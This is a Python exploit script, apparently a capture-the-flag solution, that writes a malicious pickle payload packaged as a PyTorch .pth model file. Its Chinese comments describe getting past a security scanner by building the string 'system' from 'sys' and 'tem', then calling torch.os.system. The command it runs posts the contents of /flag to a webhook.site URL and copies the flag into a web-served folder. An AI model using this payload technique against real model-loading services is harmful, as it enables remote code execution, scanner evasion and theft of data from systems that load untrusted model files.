import pickle
import zipfile
import io
import torch

# CONFIGURATION
WEBHOOK_URL = "https://webhook.site/2836268e-59ee-4f9e-a0e7-8b02441c2a11" 
CMD = f"curl -X POST -d \"$(cat /flag)\" {WEBHOOK_URL}; cp /flag /app/static/flag.txt"

# V16: 字符串拼接 + torch.os.system
# 扫描器可能对 'system' 这个字符串敏感。
# 我们利用 builtins.sum() 或 join() 来生成 'system' 字符串？
# 或者: type(obj).__name__ ? 
#
# 我们利用 list 的加法。
# ['s', 'y', 's', 't', 'e', 'm'] -> 如何变成字符串?
# ''.join(['s', ...])
# 需要 builtins.join? No, str.join.
# getattr('', 'join') -> 需要 getattr.
#
# 假设 getattr 是可用的（因为它很基础），被拦的是参数 'system'。
# Opcode:
# 1. 构造字符串 'system'
#    'sys' + 'tem'
#    getattr('sys', '__add__')('tem')
#    
#    s1 = 'sys'
#    s2 = 'tem'
#    GLOBAL 'builtins' 'getattr'
#    PUSH s1
#    PUSH '__add__' (maybe okay?)
#    REDUCE -> s1.__add__ method
#    PUSH s2
#    REDUCE -> 'system'
#
# 2. 获取 torch.os (或 sys.modules['os'])
#    GLOBAL 'torch' 'os'
#
# 3. 获取 torch.os.system
#    GLOBAL 'builtins' 'getattr'
#    PUSH torch_os_module
#    PUSH 'system' (Obfuscated string from step 1)
#    REDUCE -> system_func
#
# 4. Call(CMD)

def push_str(s):
    b = s.encode('utf-8')
    return b'X' + (len(b)).to_bytes(4, 'little') + b

STACK_GLOBAL = b'\x93'
REDUCE = b'R'
TUPLE1 = b'\x85'
TUPLE2 = b'\x86'

pkl = b'\x80\x02'

# 1. 保存 getattr 到 memo 0
pkl += push_str('builtins')
pkl += push_str('getattr')
pkl += STACK_GLOBAL
pkl += b'q\x00'

# 2. 构造 'system' 字符串
# 'sys' + 'tem'
pkl += b'h\x00' # getattr
pkl += push_str('sys')
pkl += push_str('__add__') # hope valid
pkl += TUPLE2
pkl += REDUCE # bound method 'sys'.__add__
pkl += push_str('tem')
pkl += TUPLE1
pkl += REDUCE # 'system'
pkl += b'q\x01' # save 'system' to memo 1

# 3. 构造 'os' 字符串 (虽然 torch.os 不需要字符串，但防一手)
# 暂时直接用 torch.os

# 4. 获取 torch.os
pkl += push_str('torch')
pkl += push_str('os')
pkl += STACK_GLOBAL
pkl += b'q\x02' # save module

# 5. 获取 os.system
pkl += b'h\x00' # getattr
pkl += b'h\x02' # module
pkl += b'h\x01' # 'system' string
pkl += TUPLE2
pkl += REDUCE # system function

# 6. Call
pkl += push_str(CMD)
pkl += TUPLE1
pkl += REDUCE

pkl += b'.'

def create_torch_zip(pickle_bytes):
    buffer = io.BytesIO()
    with zipfile.ZipFile(buffer, 'w', zipfile.ZIP_STORED) as zf:
        zf.writestr('archive/data.pkl', pickle_bytes)
        zf.writestr('archive/version', b'3\n')
    return buffer.getvalue()

if __name__ == "__main__":
    final_zip = create_torch_zip(pkl)
    with open("nailong_payload_v16.pth", "wb") as f:
        f.write(final_zip)
    print("[+] Generated nailong_payload_v16.pth (String Concat)")
